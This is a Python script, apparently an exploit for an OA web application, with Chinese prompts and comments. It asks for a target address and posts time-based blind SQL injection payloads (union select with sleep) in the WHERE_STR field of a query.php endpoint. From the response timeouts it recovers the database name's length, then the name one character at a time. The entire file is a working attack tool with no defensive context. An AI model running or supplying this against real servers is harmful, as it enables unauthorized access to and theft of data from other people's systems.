import requests
import string
import time


i=input("输入地址:")
url = "http://"+i+"/general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php"
def iftimeout(url,d):
    try:
        res = requests.post(url,timeout=5,data=d)
        return res.text
    except Exception as e:
        return "timeout"
dbnamelen = 0
while True:
    dbnamelen+=1
    dbnamelen_url = url
    data={"WHERE_STR":"-@`'` union select 1,2,if((length(database())>"+str(dbnamelen)+"),0,sleep(10)) #'&"}
    if "timeout" in iftimeout(dbnamelen_url,data):
        print("库名长：",dbnamelen)
        break #暴用户
dbname=""
for i in range(1,int(dbnamelen)+1):
    for j in range(48,127):
        data={"WHERE_STR":"-@`'` union select 1,2,if(ascii(substr(database(),"+str(i)+",1))>"+str(j)+",0,sleep(10)) #'&"}
        dbname_url = url
        if "timeout" in iftimeout(dbname_url,data):
            dbname+=str(chr(j))
            print("库名：",dbname)
            break #暴用户名

